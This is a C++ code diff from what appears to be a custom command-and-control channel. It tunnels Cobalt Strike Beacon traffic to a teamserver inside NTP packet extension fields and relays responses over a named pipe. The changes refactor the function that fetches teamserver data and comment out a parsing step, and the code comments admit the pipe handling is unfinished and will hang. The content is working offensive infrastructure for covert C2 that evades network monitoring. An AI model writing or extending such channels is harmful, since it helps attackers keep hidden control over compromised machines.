@@ -128,7 +128,7 @@ std::vector<uint8_t> sendBeaconDataToTeamserver(std::vector<uint8_t> data, std::
 
 //Get data from beacon
 
-std::vector<uint8_t> getBeaconDataFromTeamserver(std::vector<uint8_t> data, std::array < uint8_t, 2> extensionField, std::vector<uint8_t> clientId) {
+std::vector<uint8_t> getBeaconDataFromTeamserver(std::vector<uint8_t> clientId) {
 	std::cout << "======================" << std::endl;
 	std::cout << "Started getBeaconDataFromTeamserver" << std::endl;
 	std::cout << "======================" << std::endl;
@@ -168,11 +168,6 @@ std::vector<uint8_t> getBeaconDataFromTeamserver(std::vector<uint8_t> data, std:
 		size_t start = i * Chunk::maxChunkSize; //get how far into the data we need to be to get the chunk
 		size_t end = std::min(start + Chunk::maxChunkSize, static_cast<size_t>(dataSize)); //gets the smaller of the 2, whether that be dataSize, or start+maxChunkSize. TLDR, prevents trying to read outside of func arg provided data buffer (which is only so big)
 
-		std::vector<uint8_t> chunkData(data.begin() + start, data.begin() + end);
-
-		//std::cout << "[" << i << "/" << amountOfChunks << "]" << " ChunkData: ";
-		//printHexVector(chunkData);
-
 		//Print that we're sending a packet, adn what type of packet it is.
 		std::cout << "----------------------" << std::endl;
 		std::cout << "Sending NTP Packet [" << i + 1 << "/" << amountOfChunks << "]" << std::endl;
@@ -181,9 +176,9 @@ std::vector<uint8_t> getBeaconDataFromTeamserver(std::vector<uint8_t> data, std:
 		//creat ntp packet first
 		auto packet = NTPPacket();
 		packet.addExtensionField(
-			NtpExtensionField::getTeamServerData, //Ask server for teamserver data
+			NtpExtensionField::getDataFromTeamserver, //Ask server for teamserver data
 			emptyVec,
-			clientId //REPLACE ME WITH REAL SESSION ID
+			clientId
 		);
 
 		//pass full ntp packet 
@@ -391,23 +386,21 @@ void pipeStuff(std::vector<uint8_t> clientId) {
 		//then need to getBeaconDataFromTeamserver (which will ask the server for the data for this client)
 		std::cout << "[?] Getting data back from Teamserver" << std::endl;
 		std::vector<uint8_t> dataFromTeamserver = getBeaconDataFromTeamserver(
-			vec,
-			NtpExtensionField::dataForTeamserver,
 			clientId
 		);
 
 
 		std::cout << "[?] Theoretical data would be passed back into pipe now - not imlpemented. Next pipe read will hang because of it. " << std::endl;
 		//extract data out from chunker response
-		NTPPacketParser dataFromTeamserverClass(dataFromTeamserver);
-		auto dataForBeaconVec = dataFromTeamserverClass.getExtensionData();
+		//NTPPacketParser dataFromTeamserverClass(dataFromTeamserver);
+		//auto dataForBeaconVec = dataFromTeamserverClass.getExtensionData();
 
 		std::cout << "[?] Data being written to pipe: ";
-		printHexVector(dataForBeaconVec);
+		printHexVector(dataFromTeamserver);
 		std::cout << std::endl;
 
 		//convert to const char * as that's what write_frame wants
-		auto dataForBeacon = reinterpret_cast<char*>(dataForBeaconVec.data());
+		auto dataForBeacon = reinterpret_cast<char*>(dataFromTeamserver.data());
 
 		/* write to our named pipe Beacon */
 		write_frame(handle_beacon, dataForBeacon, read);
